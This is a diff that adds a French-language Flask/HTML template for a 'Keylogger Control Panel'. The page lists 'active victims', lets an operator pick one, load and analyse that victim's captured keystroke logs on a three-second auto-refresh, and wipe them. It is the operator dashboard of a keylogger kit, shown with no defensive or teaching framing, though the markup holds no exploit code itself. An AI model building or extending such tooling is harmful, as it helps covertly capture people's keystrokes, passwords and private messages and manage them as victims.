@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keylogger Control Panel</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <nav class="navbar navbar-dark bg-dark">
+        <div class="container-fluid">
+            <span class="navbar-brand mb-0 h1">🔐 Keylogger Control Panel</span>
+            <span class="text-light" id="status-indicator">●</span>
+        </div>
+    </nav>
+
+    <div class="container-fluid mt-4">
+        <div class="row">
+            <!-- Colonne gauche : Liste des victimes -->
+            <div class="col-md-4">
+                <div class="card">
+                    <div class="card-header bg-primary text-white">
+                        <h5 class="mb-0">Victimes Actives</h5>
+                        <small id="victims-count">0 victime(s)</small>
+                    </div>
+                    <div class="card-body">
+                        <button class="btn btn-sm btn-outline-primary mb-3" onclick="refreshVictims()">
+                            🔄 Actualiser
+                        </button>
+                        <div id="victims-list" class="list-group">
+                            <div class="text-center text-muted">Chargement...</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Statistiques -->
+                <div class="card mt-3">
+                    <div class="card-header bg-info text-white">
+                        <h6 class="mb-0">Statistiques</h6>
+                    </div>
+                    <div class="card-body">
+                        <div id="stats">
+                            <p class="mb-1"><strong>Total logs:</strong> <span id="total-logs">0</span></p>
+                            <p class="mb-1"><strong>Dernière activité:</strong> <span id="last-activity">-</span></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Colonne droite : Logs et Analyse -->
+            <div class="col-md-8">
+                <!-- Sélection de victime -->
+                <div class="card mb-3">
+                    <div class="card-body">
+                        <div class="row align-items-center">
+                            <div class="col-md-6">
+                                <label for="victim-select" class="form-label">Sélectionner une victime:</label>
+                                <select id="victim-select" class="form-select" onchange="loadVictimLogs()">
+                                    <option value="">-- Choisir une victime --</option>
+                                </select>
+                            </div>
+                            <div class="col-md-6 text-end">
+                                <button class="btn btn-success btn-sm" onclick="loadVictimLogs()">
+                                    📥 Charger les logs
+                                </button>
+                                <button class="btn btn-info btn-sm" onclick="analyzeCurrentVictim()">
+                                    🔍 Analyser
+                                </button>
+                                <button class="btn btn-warning btn-sm" onclick="clearLogs()">
+                                    🗑️ Effacer
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Affichage des logs -->
+                <div class="card">
+                    <div class="card-header bg-secondary text-white d-flex justify-content-between align-items-center">
+                        <h5 class="mb-0">Logs</h5>
+                        <div>
+                            <label class="form-check-label text-white">
+                                <input type="checkbox" id="auto-refresh" checked onchange="toggleAutoRefresh()">
+                                Auto-refresh (3s)
+                            </label>
+                        </div>
+                    </div>
+                    <div class="card-body">
+                        <div id="logs-display" class="logs-container">
+                            <p class="text-muted text-center">Sélectionnez une victime pour voir les logs</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Analyse -->
+                <div class="card mt-3" id="analysis-card" style="display: none;">
+                    <div class="card-header bg-success text-white">
+                        <h5 class="mb-0">Analyse</h5>
+                    </div>
+                    <div class="card-body">
+                        <div id="analysis-content"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+</html>
+
